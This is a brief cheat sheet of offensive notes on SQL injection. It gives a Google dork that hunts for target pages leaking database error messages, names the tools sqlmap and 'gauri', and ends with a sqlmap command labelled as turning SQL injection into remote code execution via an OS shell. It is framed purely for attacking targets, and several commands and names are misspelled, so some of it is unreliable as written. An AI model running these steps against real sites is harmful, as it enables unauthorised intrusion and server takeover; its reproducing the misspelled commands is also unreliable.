Google Dorks for sqli:- `site:target.com intext:"sql syntax near"| intext:"syntax error has occured"|intext:"incorrect syntax near"| intext:"unexcepted end of SQL commmand"| intext:"Warning mysql_query()" | intext:"Warning:pg_connect()" | intext: "internal server error" | intext:"You have an error in you SQL syntax" | intext:"Query failed" | intext:"Database error" | intext:"Invalid SQL statement" | intext:"Undefined index" | intext:"Data type mismatch" | intext:"Table not found" | intext:"Division by zero" | intext:"Statement could not be executed" | intext:"General error" | intext:"Too many connections" | intext:"Access denied"``



TOOLS
1) sqlmap 
2) gauri

-->`sqlmap -r target.txt --os-shello` -> SQLi to RCE